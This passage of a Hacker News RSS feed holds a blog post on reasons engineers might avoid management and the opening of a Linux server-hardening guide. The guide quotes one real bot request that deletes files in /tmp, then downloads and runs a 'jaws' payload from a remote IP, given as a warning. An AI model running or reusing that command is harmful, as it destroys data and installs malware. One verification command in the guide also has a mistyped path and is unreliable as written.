            <description><![CDATA[<p>URL: <a href="https://charity.wtf/2019/09/08/reasons-not-to-be-a-manager/">https://charity.wtf/2019/09/08/reasons-not-to-be-a-manager/</a>, See on <a href="https://news.ycombinator.com/item?id=36934135">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		<p>Yesterday we had a super fun meetup here at Intercom in Dublin.&nbsp; We split up into small discussion groups and talked about things related to managing teams and being a senior individual contributor (IC), and going back and forth throughout your career.</p>
<p>One interesting question that came up repeatedly was: “what are some reasons that someone might&nbsp;<em>not</em> want to be a manager?”</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">"Things would be different if I was in charge", the all belief that authority is an all powerful magic wand you can wave and fix things.</p>— Mark Roddy (@digitallogic) <a href="https://twitter.com/digitallogic/status/1169625740796579842?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>
<p>Fascinatingly, I heard it asked over the full range of tones from extremely positive (“what kind of nutter&nbsp;<em>wouldn’t&nbsp;</em>want to manage a team?!”) to extremely negative (“who would <em>ever</em> want to manage a team?!”).&nbsp; So I said I would write a piece and list some reasons.</p>
<p>Point of order: <strong>I am going to focus on intrinsic reasons</strong>, not external ones.&nbsp; There are lots of toxic orgs where you wouldn’t want to be a manager for many reasons — but that list is too long and overwhelming, and I would argue you probably don’t want to work there in ANY capacity.&nbsp; Please assume the surroundings of a functional, healthy org (I know, I know — whopping assumption).</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">it's a huge responsibility. if you are having trouble advocating for yourself and your own needs/career goals/work output, then you may not have the capacity to do it for the people you're responsible for managing. i take the role extremely seriously, and it takes a toll.</p>— pie bob (@djpiebob) <a href="https://twitter.com/djpiebob/status/1169675819716763649?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>
<h3>1. You love what you do.</h3>
<p>Never underestimate this one, and <em>never</em> take it for granted.&nbsp; If you look forward to work and even miss it on vacation; if you occasionally leave work whistling with delight and/or triumph; if your brain has figured out how to wring out regular doses of dopamine and serotonin while delivering ever-increasing value; if you look back with pride at what you have learned and built and achieved, if you regularly tap into your creative happy place … hell, your life is already better than 99.99% of all the humans who have ever labored and lived.&nbsp; Don’t underestimate the magnitude of your achievement, and don’t assume it will always be there waiting for you to just pick it right back up again.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">I got into tech because I like writing code. As a manager, I didn’t get to do that. Becoming a not-manager lets me do that again.</p>— Ben Cox (@BenCoxMusic) <a href="https://twitter.com/BenCoxMusic/status/1169780841532276736?ref_src=twsrc%5Etfw">September 6, 2019</a></blockquote>
<h3>2. It is easy to get a new engineering job.&nbsp; Really, really easy.</h3>
<p>Getting your first gig as an engineer can be a challenge, but after that?&nbsp; It is possibly easier for an experienced engineer to find a new job than anyone else on the planet. There is so much demand this skill set that we actually complain about how annoying it is being constantly recruited!&nbsp; Amazing.</p>
<p>It is typically harder to find a new job as a manager.&nbsp; If you think interview processes for engineers are terrible (and they are, honey), they are even weirder and less predictable (and more prone to implicit bias) for managers.&nbsp; So much of manager hiring is about intangibles like “culture fit” and “do I like you” — things you can’t practice or study or know if you’ve answered correctly.&nbsp; And soooo much of your skill set is inevitably bound up in navigating the personalities and bureaucracies of particular teams and a particular company.&nbsp; A manager’s effectiveness is grounded in trust and relationships, which makes it much less transferrable than engineering skills.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">Someone has probably said it, but management will always be an option, but going back from management to writing code again can be very difficult (after some period of time). Anyway, looking forward to the post.</p>— Zack Korman (@ZackKorman) <a href="https://twitter.com/ZackKorman/status/1169839214113898501?ref_src=twsrc%5Etfw">September 6, 2019</a></blockquote>
<h3>3. There are fewer management jobs.</h3>
<p>I am not claiming it is equally trivial for <em>everyone</em> to get a new job; it can be hard if you live in an out-of-the-way place, or have an unusual skill, etc.&nbsp; But in almost every case, it becomes harder if you’re a manager.&nbsp; Besides — given that the ratio of engineers to line managers is roughly 7 to one — there will be almost an order of magnitude fewer eng manager jobs than engineering jobs.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">Regardless of org health, there's a _lot_ of emotional labor involved. Whether that's good for you personally depends a lot on circumstances, and how much of it you tend to take home with you. If it's too much to take, probably not good to manage, either for you or your team.</p>— Alex Rasmussen (@alexras) <a href="https://twitter.com/alexras/status/1169679343791951872?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>
<h3>4. Manager jobs are the first to get cut.</h3>
<p>Engineers (in theory) add value directly to the bottom line.&nbsp; Management is, to be brutally frank, overhead.&nbsp; Middle management is often the first to be cut during layoffs</p>
<p>Remember how I said that creation is the engineering superpower?&nbsp; That’s a nicer way of saying that managers don’t directly create any value.&nbsp; They may indirectly contribute to increased value over time — the good ones do — but only by working through other people as a force multiplier, mentor etc.&nbsp; When times get tough, you don’t cut the people who build the product, you cut the ones whose value-added is contingent or harder to measure.</p>
<p>Another way this plays out is when companies are getting acquired.&nbsp; As a baseline for acquihires, the acquiring company will estimate a value of $1 million per engineer, then&nbsp;<em>deduct</em>&nbsp;$500k for every other role being acquired.&nbsp; Ouch.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">I noticed that as soon as I had a competent manager, I never considered going into management ever again 😀</p>— daiyi! ✨ (chris) (@daiyitastic) <a href="https://twitter.com/daiyitastic/status/1169674769005867008?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>
<h3>5. Managers can’t really job hop.</h3>
<p>Where it’s completely normal for an engineer to hop jobs every 1-3 years, a manager who does this will not get points for learning a wide range of skills, they’ll be seen as “probably difficult to work with”.&nbsp; I have no data to support this, but I suspect the job tenure of a successful manager is at least 2-3x as long as that of a successful IC.&nbsp; It takes a year or two just to gain the trust of everyone on your team and the adjacent teams, and to learn the personalities involved in navigating the organization.&nbsp; At a large company, it may take a few times that long.&nbsp; I was a manager at Facebook for 2.5 years and I still learned some critical new detail about managing teams there on a weekly basis.&nbsp; Your value to the org really kicks in after a few years have gone by, once a significant part of the way things get done resides in your cranium.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">As a PE who deliberately "leads" but has no interest in "management": I have stomach-churning aversion to the disciplinary/compensation/downsizing side of management, and a nontrivial chunk of my job satisfaction still comes from learning/exploring hard technical problems.</p>— Sean Blakey (@pythonista) <a href="https://twitter.com/pythonista/status/1169698084240031744?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>
<h3>6) Engineers can be little shits.</h3>
<p>You know the type.&nbsp; Sneering about how managers don’t do any “real work”, looking down on them for being “less technical”.&nbsp; Basically everyone who utters the question “.. but how <em>technical </em>are they?” in that particular tone of voice is a shitbird.&nbsp; Hilariously, we had a great conversation about whether a great manager needs to be technical or not — many people sheepishly admitted that the best managers they had ever had knew absolutely nothing about technology, and yet they gave managers coding interviews and expected them to be technical.&nbsp; Why?&nbsp; Mostly because the engineers wouldn’t respect them otherwise.</p>
<p><a href="https://twitter.com/jetpack/status/1169685458340573184">https://twitter.com/jetpack/status/1169685458340573184</a></p><h3>7.&nbsp; As a manager, you will need to have some hard conversations.&nbsp; Really, really hard ones.</h3>
<p>Do you shy away from confrontation?&nbsp; Does it seriously stress you out to give people feedback they don’t want to hear?&nbsp; Manager life may not be for you.&nbsp; There hopefully won’t be too many of these moments, but when they do happen, they are likely to be of outsized importance.&nbsp; Having a manager who avoids giving critical feedback can be&nbsp; really damaging, because it deprives you of the information you need to make course corrections before the problem becomes <em>really</em> big and hard.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">Being a good manager takes emotional maturity, and it can be exhausting to always handle interpersonal problems well. Idk, I like to think I did better than ave, but holding people accountable? Giving the tough talks? If you hate that, do us all a fav and don't be a mgr.</p>— C Guthrie (@cguthrie00) <a href="https://twitter.com/cguthrie00/status/1169785573814484998?ref_src=twsrc%5Etfw">September 6, 2019</a></blockquote>
<h3>8)&nbsp; A manager’s toolset is smaller than you think.</h3>
<p>As an engineer, if you really feel strongly about something, you just go off and do it yourself.&nbsp; As a manager, you have to lead through influence and persuasion and inspiring other people to do things.&nbsp; It can be quite frustrating.&nbsp; “But can’t I just tell people what to do?” you might be thinking.&nbsp; And the answer is no.&nbsp; Any time you have to tell someone what to do using your formal authority, you have failed in some way and your actual influence and power will decrease.&nbsp; Formal authority is a blunt, fragile instrument.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><div lang="en" dir="ltr"><p>For a technical person, being a principal in a company with a two track career ladder, is all the best parts of managing a team without the down sides.</p><p>There is still plenty of room to learn and  grow, career wise.</p><p>Best companies enable people to swap tracks back and forth.</p></div>— Iain Hull (@IainHull) <a href="https://twitter.com/IainHull/status/1169705108319457280?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>
<blockquote data-width="550" data-dnt="true">
<p lang="en" dir="ltr">3. If you go become a manager because you want to be the one making the decisions, imagine how happy you'd be with a manager like that. Also remember you're also going to have your own manager<br>4. Your current skillset is irrelevant. Humans are random &amp; heterogenous. It's hard.</p>
<p>— Omer van Kloeten (@omervk) <a href="https://twitter.com/omervk/status/1169649293936009222?ref_src=twsrc%5Etfw">September 5, 2019</a></p></blockquote>

<h3>9) You will get none of the credit, and all of the blame.</h3>
<p>When something goes well, it’s your job to push all the credit off onto the people who did the work.&nbsp; But if you failed to ship, or and, or hire, or whatever?&nbsp; The responsibility is all on you, honey.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">Advice I’ve given to a direct, “You like credit too much.  Being a manager is not about you any more.”</p>— Damien Ryan (@djryan) <a href="https://twitter.com/djryan/status/1169716659306881027?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">As an engineer, I have always assumed management to be a bad economic bargain - 300% increase in stress and responsibility for a 0-20% pay raise.</p>— David Falkner (@ardave2002) <a href="https://twitter.com/ardave2002/status/1169828158566125569?ref_src=twsrc%5Etfw">September 6, 2019</a></blockquote>
<h3>10)&nbsp; Use your position as an IC to bring balance to the Force.</h3>
<p>I LOVE working in orgs where ICs have power and use their voices.&nbsp; I love having senior ICs around who model that, who walk around confidently assuming that their voice is wanted and needed in the decision-making process.&nbsp; If your org is not like that, do you know who is best positioned to shift the balance of power back?&nbsp; Senior ICs, with some behind-the-scenes support from managers.&nbsp; For this reason, I am always a little sad when a vocal, powerful IC who models this behavior transitions to management.&nbsp; If ALL of the ICs who act this way become managers, it sends a very dismaying message to the ranks — that you only speak up if you’re in the process of converting to management.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">Not the optimal way to achieve impact given the setup of our organization, my personal skills, and work it would necessarily trade off with.</p>— Patrick McKenzie (@patio11) <a href="https://twitter.com/patio11/status/1169824632620240899?ref_src=twsrc%5Etfw">September 6, 2019</a></blockquote>
<h3>11)&nbsp; Management is just a collection of skills, and you should be able to do all the fun ones as an IC.</h3>
<p>Do you love mentoring?&nbsp; Interviewing, constructing hiring loops, defining the career ladder?&nbsp; Do you love technical leadership and teaching other people, or running meetings and running projects?&nbsp; Any reasonably healthy org should encourage all senior ICs to participate and have leadership roles in these areas.&nbsp; Management can be unbundled into a lot of different skills and roles, and the only ones that are necessarily confined to management are the shitty ones, like performance reviews and firing people.&nbsp; I LOVE it when an engineer expresses the desire to start learning more management skills, and will happily brainstorm with them on next steps — get an intern? run team meetings?&nbsp; there are so many things to choose from!&nbsp; When I say that all engineers should try management at some point in their career, what I really mean is these are skills that every senior engineer should develop.&nbsp; Or as Jill says:</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">I tell people all the time that you can do most of the "fun" management things (mentoring, coaching, watching people grow, contributing to decision making) as an IC without doing all the terrible parts of management (firing, budgeting, serious HR things).</p>— Jill Wetzler (@JillWetzler) <a href="https://twitter.com/JillWetzler/status/1169578552439820288?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>
<h3>12) Joy is much harder to come by.</h3>
<p>That dopamine drip in your brain from fixing problems and learning things goes away, and it’s … real tough.&nbsp; This is why I say you need to <a href="https://charity.wtf/2019/01/04/engineering-management-the-pendulum-or-the-ladder/">commit to a two year stint</a> if you’re going to try management: that, plus it takes that long to start to get your feet under you and is hard on your team if they’re switching managers all the time.&nbsp; It usually takes a year or two to rewire your brain to look for the longer timeline, less intense rewards you get from coaching other people to do great things.&nbsp; For some of us, it never does kick in.&nbsp; It’s genuinely hard to know whether you’ve done anything worth doing.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">As a manager who frequently falls down a mental hole about not being totally sure I ever achieve anything or add value: sometimes you can go for long periods unsure you have achieved anything or added value 🙂</p>— karambola (spice bag) (@karambola_dotca) <a href="https://twitter.com/karambola_dotca/status/1169826158751338497?ref_src=twsrc%5Etfw">September 6, 2019</a></blockquote>
<h3>13) It will take up emotional space at the expense of your personal life.</h3>
<p>When I was an IC, I would work late and then go out and see friends or meet up at the pub almost every night.&nbsp; It was great for my dating life and social life in general.&nbsp; As a manager, I feel like curling up in a fetal position and rolling home around 4 pm.&nbsp; I’m an introvert, and while my capacity has increased a LOT over the past several years, I am still sapped every single day by the emotional needs of my team.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">As an engineer who's survived this long in the biz I know two things: a) I'm really good at dealing with technical stuff, and b) I'm really not good at dealing with people.</p>— Mudslingin Raccoon (@troglobit) <a href="https://twitter.com/troglobit/status/1169673675399999488?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>
<h3>14) Your time doesn’t belong to you.</h3>
<p>It’s hard to describe just how much your life becomes not your own.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><div lang="en" dir="ltr"><p>My #1 reason:<br>"Hermit mode" is sometimes how I've cope when I get sufficiently stressed out.</p><p>That's really, really not something I can imagine inflicting on a report, not to mention that the *potential* of doing so is stressful... ergo, self-fulfilling prophecy</p></div>— Isobel Redelmeier (@1z0b31) <a href="https://twitter.com/1z0b31/status/1169804763933753345?ref_src=twsrc%5Etfw">September 6, 2019</a></blockquote>
<h3>15) Meetings.</h3>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">Schedule flexibility is an often overlooked reason. Coming back from maternity leave, big trip, sick days are easier if you don’t have a team whose day to day you are responsible for. Also meetings tend not to be very movable time wise.</p>— Yao Yue 岳峣 (@thinkingfish) <a href="https://twitter.com/thinkingfish/status/1169655009392250880?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>
<h3>16) If technical leadership is what your heart loves most, you should NOT be a manager.</h3>
<p>If you are a strong tech lead and you convert to management, it is your job to begin slowly taking yourself out of the loop as tech lead and promoting others in your place.&nbsp; Your technical skills will stop growing at the point that you switch careers, and will slowly decay after that.&nbsp; Moreover, if you stay on as tech lead/manager you will slowly suck all the oxygen from the room.&nbsp; It is your job to train up and hand over to your replacements and gradually step out of the way, period.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">For a while, I personally struggled to switch my mindset from deriving my sense of personal success on the code I shipped to the impact the team(s) I supported were delivering. I have definitely seen others fail to make that change and personally suffer for it.</p>— Joshua Sheppard (@joshualsheppard) <a href="https://twitter.com/joshualsheppard/status/1169792104018718720?ref_src=twsrc%5Etfw">September 6, 2019</a></blockquote>
<h3>17) It will always be there for you later.</h3>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">Wish we could avoid the either/or of manager vs individual contributor. There’s also practice leaders who might not manage within a formal org sense but are specialists and still lead teams and innovative thinking. Best job at the company IMHO</p>— Emily Wengert (@wallowmuddy) <a href="https://twitter.com/wallowmuddy/status/1169740518802300928?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>
<h3>In conclusion</h3>
<p>Given all this, why should ANYONE ever be a manager?&nbsp; Shrug.&nbsp; I don’t think there’s any one good or bad answer.&nbsp; I used to think a bad answer would be “to gain power and influence” or “to route around shitty communication systems”, but in retrospect those were my reasons and I think things turned out fine.&nbsp; It’s a complex calculation.&nbsp; If you want to try it and the opportunity arises, try it!&nbsp; Just commit to the full two year experiment, and pour yourself into learning it like you’re learning a new career — since, you know, you <em>are</em>.</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><div lang="en" dir="ltr"><p>"If you want to spend your emotional energy outside of work "</p><p>This one, for me, + Angelina's fantastic response</p></div>— Pam Selle (@pamasaur) <a href="https://twitter.com/pamasaur/status/1169641930713645057?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>
<p>But please do be honest with yourself.&nbsp; One thing I hate is when someone wants to be a manager, and I ask why, and they rattle off a list of reasons they’ve heard that people SHOULD want to become managers (“to have a greater impact than I can with just myself, because I love helping other people learn and grow, etc”) but I am damn sure they are lying to themselves and/or me.</p>
<p>Introspection and self-knowledge are absolutely key to being a decent manager, and lord knows we need more of those.&nbsp; So don’t kick off your grand experiment by lying to yourself, ok?</p>
<blockquote data-conversation="none" data-width="550" data-lang="en" data-dnt="true" data-partner="jetpack"><p lang="en" dir="ltr">And also, the people who excel at all those management tasks, the ICs who would actually make *great* managers but don't want to do it? They make the *best* ICs. Literally a dream. They make my job so much easier in so many ways. Wouldn't trade them.</p>— Jill Wetzler (@JillWetzler) <a href="https://twitter.com/JillWetzler/status/1169580795448700928?ref_src=twsrc%5Etfw">September 5, 2019</a></blockquote>

			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Reluctant Sysadmin's Guide to Securing a Linux Server (216 pts)]]></title>
            <link>https://pboyd.io/posts/securing-a-linux-vm/</link>
            <guid>36934052</guid>
            <pubDate>Sun, 30 Jul 2023 17:59:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pboyd.io/posts/securing-a-linux-vm/">https://pboyd.io/posts/securing-a-linux-vm/</a>, See on <a href="https://news.ycombinator.com/item?id=36934052">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
				<figure>
    <img src="https://pboyd.io/posts/securing-a-linux-vm/aws-launch.png" alt="Successful AWS VM launch" sizes="(max-width: 390px) 275px, (max-width: 520px) 350px, 490px" srcset="https://pboyd.io/posts/securing-a-linux-vm/aws-launch-275.png 275w, https://pboyd.io/posts/securing-a-linux-vm/aws-launch-350.png 350w, https://pboyd.io/posts/securing-a-linux-vm/aws-launch.png 490w">
    
    
</figure>

<p>I’m not a sysadmin, and I don’t want to be. But I write software for the web, which means I’m never far from a server, and sometimes I’m the only one around. So even if I didn’t want the job, I have it, and I need to take the security of these hosts seriously. If you’re in a similar situation, this guide is for you. I’ll walk you through the steps I use to harden a new virtual machine from a cloud provider.</p>
<p>Ideally, you would automate everything here. But this is a manual guide, where I assume you’ll be typing the commands. I know people still manually configure servers, and if you’re going to do it, at least do it securely. But I hope after you’ve gone through this once or twice, you’ll automate it. I’ll have more to say about automation at the end.</p>
<p>I’m making a few assumptions to keep this post brief:</p>
<ul>
<li>Your host is a VM from a cloud provider (AWS, GCP, Linode, etc.) with a standard machine image.</li>
<li>Your server has Debian 11 (Bullseye) or Ubuntu. The same basic procedure should work with any Linux distribution, but the details will vary.</li>
<li>You know your way around the Linux shell (if you can navigate directories and edit files, you’ll be fine).</li>
</ul>
<h2 id="know-your-enemy">Know your enemy</h2>
<p>Before we get into it, we need to know what we’re up against, and first up are bots. As an experiment, I started a VM in AWS and enabled SSH passwords, and started an HTTP server. After only an hour, I had one failed SSH login and a dozen requests for things like:</p>
<pre tabindex="0"><code>GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.231/jaws;sh+/tmp/jaws
</code></pre><p>I don’t know what <code>jaws</code> does, but it doesn’t sound friendly. (Hopefully, it’s obvious, but don’t run that–if you really must, I reversed the last octet of the IP address.)</p>
<p>These bots scan the Internet looking for any vulnerable systems. The good news is that they’re not out to get you so much as they’re out to get anyone. These attacks are usually easy to stop, keep your host updated, and be a little bit tougher than the next host on their list.</p>
<p>But sometimes, there is someone out to get you personally, and sadly no system is truly safe. The best we can do is block what’s known, put up defenses at every layer, and hope we’ve become more trouble than we’re worth. On that cheery note, let’s dive in.</p>
<h2 id="update-the-software">Update the software</h2>
<p>Even if you just launched it, your system is probably already outdated. There might even be a critical security vulnerability that didn’t make it into the VM image. So to start:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo apt update
</span></span><span><span>sudo apt upgrade
</span></span></code></pre></div><h2 id="create-a-user-account">Create a user account</h2>
<p>You should not log in directly as <code>root</code>. Use another account and <code>sudo</code> when you need superuser access. Your cloud VM likely has another account already, which you can use, if you wish. But I prefer to make a new account because the default one tends to be obvious.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>sudo useradd -m -s /bin/bash <span>\
</span></span></span><span><span><span></span>  -G users,sudo <span>\
</span></span></span><span><span><span></span>  alfred
</span></span></code></pre></div><p>Name your account whatever you like, but avoid anything easily guessable, like <code>admin</code>.</p>
<p>The <code>-G</code> line lists groups that the user belongs to. The <code>sudo</code> group will grant access to run commands as <code>root</code> (assuming <code>sudo</code> is configured this way, which it usually is).</p>
<p>You’ll need a password for this account. You won’t log in with this password, but you will need it for <code>sudo</code>, so pick a good one. Ideally, generate a random one in your password manager. To set the password:</p>
<p>If your VM image disables password logins with SSH, copy the key from the default account to your new account:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>cp -r ~<span>{</span>admin,alfred<span>}</span>/.ssh
</span></span><span><span>chown -R alfred:alfred ~alfred/.ssh/
</span></span></code></pre></div><p>Log out and back in as your new user and verify that sudo works:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>sudo bash -c <span>'echo "I am $USER!"'</span>
</span></span></code></pre></div><p>It should ask for your password. If it works without a password, then run <code>sudo visudo</code> and replace the line that begins with <code>%sudo</code> with:</p>
<pre tabindex="0"><code>%sudo   ALL=(ALL:ALL) ALL
</code></pre><p>Make sure <code>sudo</code> works before moving on because you can lock yourself out of <code>root</code> if you’re not careful.</p>
<p>We don’t want to leave old unused accounts around. So if there’s a default account from your VM image, delete it:</p>
<h2 id="disable-root-logins">Disable root logins</h2>
<p>Now that we have an account with <code>sudo</code> privileges, there’s no reason anyone should log in with <code>root</code>. First, disable root at the console:</p>
<p>Now prevent <code>root</code> from logging in over SSH. Add (or uncomment) this line in <code>/etc/ssh/sshd_config</code>:</p>
<pre tabindex="0"><code>PermitRootLogin no
</code></pre><p>You will have to restart <code>sshd</code> for the change to take effect, but we’ll have a few more SSH config changes. If you’re anxious to do it now, run:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>sudo systemctl restart ssh
</span></span></code></pre></div><h2 id="umask"><code>umask</code></h2>
<p>We need to change the default <code>umask</code>, which controls the permissions on new files and directories. Most Linux distributions default <code>umask</code> to <code>022</code>, which gives read access to every user. Run <code>umask</code> to see your current setting.</p>
<p>We want a <code>umask</code> of <code>077</code>, which removes access to every user except the one who created the file. <code>027</code> would work, too (full access for the owner, read for group, and nothing for other). The point is that it’s safer to loosen file permissions when needed rather than tighten them.</p>
<p>For <code>sh</code> and <code>bash</code>, we can add <code>umask</code> to <code>/etc/profile</code>:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo bash -c <span>'echo -e "\numask 077" &gt;&gt; /etc/profile'</span>
</span></span></code></pre></div><p>If you use another shell, I will assume you know where to configure it.</p>
<p>Log out and back in, then verify new files have the desired permissions:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>$ touch xyz ; ls -l xyz ; rm xyz
</span></span><span><span>-rw------- <span>1</span> alfred alfred <span>0</span> Mar <span>25</span> 11:23 xyz
</span></span></code></pre></div><h2 id="ssh-keys">SSH keys</h2>
<p>I know you, and I always use new, randomly generated passwords for every account, but most people don’t. Someday you may grant access to someone with bad password hygiene, so it’s best to start right and only allow logins by SSH key. Your cloud provider probably already configured an SSH key for you, but don’t skip this section because the default settings still need to be tweaked.</p>
<p>If you have an SSH key already that you want to use, then great. If not, and you’re on Linux or Mac, generate one:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>ssh-keygen -t rsa -b <span>4096</span>
</span></span></code></pre></div><p>If you’re on Windows, <a href="https://www.puttygen.com/">PuTTYgen</a> should work (but don’t ask me about it because I’ve never used it).</p>
<p>Back on the server now. By default, SSH reads authorized keys from <code>$HOME/.ssh/authorized_keys</code>. The problem is that if an attacker finds an exploit that lets them write one file, you can be sure they’ll attempt to add a public key to <code>$HOME/.ssh/authorized_keys</code>. It’s safer if only <code>root</code> can add an SSH key.</p>
<p>We need a central place to keep public keys:</p>
<pre tabindex="0"><code>sudo mkdir -p /etc/ssh/authorized_keys
sudo chmod 0711 /etc/ssh/authorized_keys
</code></pre><p>The permissions on the directory give <code>root</code> full access. Everyone else can read files but not create them or even get a directory listing.</p>
<p>We’ll create one file in this directory for each user with SSH access. If you already have an <code>authorized_keys</code> file, you can copy it into place:</p>
<pre tabindex="0"><code>sudo cp ~alfred/.ssh/authorized_keys /etc/ssh/authorized_keys/alfred
</code></pre><p>If not, paste the public key:</p>
<pre tabindex="0"><code>sudo bash -c 'echo your public ssh key &gt; /etc/ssh/authorized_keys/alfred'
</code></pre><p>The last step is to make the file readable by the user:</p>
<pre tabindex="0"><code>sudo setfacl -m u:alfred:r /etc/ssh/authorized_keys/alfred
</code></pre><p>If <code>setfacl</code> doesn’t exist, install it with <code>sudo apt install acl</code>.</p>
<p>Before continuing, make sure that your user can read their <code>authorized_keys</code> file:</p>
<pre tabindex="0"><code>cat /etc/ssh/authorized/keys/$USER
</code></pre><p>If you can’t read it now, SSH won’t be able to read it from your account either, and you’ll be locked out.</p>
<p>Now configure SSH to read public keys from our central directory by adding this to <code>/etc/ssh/sshd_config</code>:</p>
<pre tabindex="0"><code>AuthorizedKeysFile /etc/ssh/authorized_keys/%u
</code></pre><p>While we’re editing <code>sshd_config</code>, we also want to disable password logins (this may already be set):</p>
<pre tabindex="0"><code>PasswordAuthentication no
</code></pre><p>Restart <code>sshd</code> for those changes to take effect:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo systemctl restart ssh
</span></span></code></pre></div><p>Don’t log out yet. But do log in from another terminal window to make sure it works.</p>
<p>If you have an old <code>authorized_keys</code> file, delete it: <code>rm ~/.ssh/authorized_keys</code> (it isn’t insecure, it’s just confusing to leave an unused file in place).</p>
<h2 id="wireguard">WireGuard</h2>
<p>We’ve done the basics to lock down SSH. But, ideally, SSH would not be accessible from the Internet. You could use firewall rules to restrict access to specific IP addresses. But in my case, I have a dynamic IP, and I don’t want to run a bastion host, so that won’t work for me. Fortunately, <a href="https://www.wireguard.com/">WireGuard</a> makes running a VPN easy.</p>
<p>If you haven’t heard of it, WireGuard is a peer-to-peer VPN. There isn’t a central server. On each host, you set the public keys of its authorized peers. It’s a little bit work to configure, but it works well.</p>
<p>One drawback to WireGuard is that the connection goes both ways. If your server is compromised, the attacker can reach any configured peer. Personally, I have the other side of the WireGuard tunnel in a local VM that blocks inbound connections from the tunnel.</p>
<p>However you do it, I will assume you have some other host already configured with WireGuard. Before we get started, you’ll need:</p>
<ul>
<li>The public key and private IP of the peer you want to connect from.</li>
<li>The private IP to assign to the server. It should be in the same subnet as the peer.</li>
</ul>
<p>Start by installing WireGuard. It’s simple in Debian Bullseye and recent Ubuntu versions:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo apt install wireguard 
</span></span></code></pre></div><p>Now generate a key pair:</p>
<pre tabindex="0"><code>sudo mkdir -p /etc/wireguard
sudo sh -c 'wg genkey | tee /etc/wireguard/private_key | wg pubkey &gt; /etc/wireguard/public_key'
</code></pre><p>And create a config file in <code>/etc/wireguard/wg0.conf</code>:</p>
<pre tabindex="0"><code>[Interface]
Address = 192.168.50.2/24
PrivateKey = &lt;THE PRIVATE KEY&gt;
ListenPort = 12345

[Peer]
PublicKey = u8Uo3ab+psKeOpciUIaNuBulNrOCXrU8GN3yD06/0WM=
AllowedIPs = 192.168.50.1/32
</code></pre><p>You’ll need to set the address to an IP on the same subnet as the computer you’re accessing it from. Also, configure the correct <code>AllowedIPs</code> and <code>PublicKey</code>. You can copy/paste the <code>PrivateKey</code>, or use <code>:r /etc/wireguard/private_key</code> in VIM.</p>
<p>Set <code>ListenPort</code> to any random ephemeral port number. You can generate one in Bash:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>echo <span>$((</span>$SRANDOM <span>%</span> <span>55535</span> <span>+</span> <span>10000</span><span>))</span>
</span></span></code></pre></div><p>The port number isn’t a secret per se, but WireGuard hides itself well, so we might as well prevent an attacker from knowing it.</p>
<p>If your cloud provider has a firewall, don’t forget to open WireGuard’s UDP port.</p>
<p>Now start WireGuard:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo systemctl start wg-quick@wg0
</span></span><span><span>sudo systemctl enable wg-quick@wg0
